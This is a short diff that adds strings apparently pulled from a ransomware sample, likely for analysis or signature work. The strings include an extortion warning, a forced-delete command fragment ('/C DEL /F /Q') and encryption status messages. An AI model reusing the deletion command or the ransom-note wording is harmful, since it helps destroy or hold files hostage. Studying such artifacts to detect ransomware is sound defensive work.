@@ -1,0 +1,14 @@
+
+DANGER !!!
+\\r\\nDO NOT MODIFY or try to RECOVER any files yourself.
+We WILL NOT be able to RESTORE them.
+\\r\\n!!!
+DANGER !!!
+\\r\\n -path INF DBG /C DEL /F /Q
+>>
+NUL ComSpec README .TXT
+Start Encrypting Target Folder Encrypt Mode - AUTO Started %
+u I/O
+Workers Encrypted %u file(s)
+Start Encrypt [Handle %u]
+File Encrypted Successful Encrypt Mode - FAST Encrypt Mode - FULL
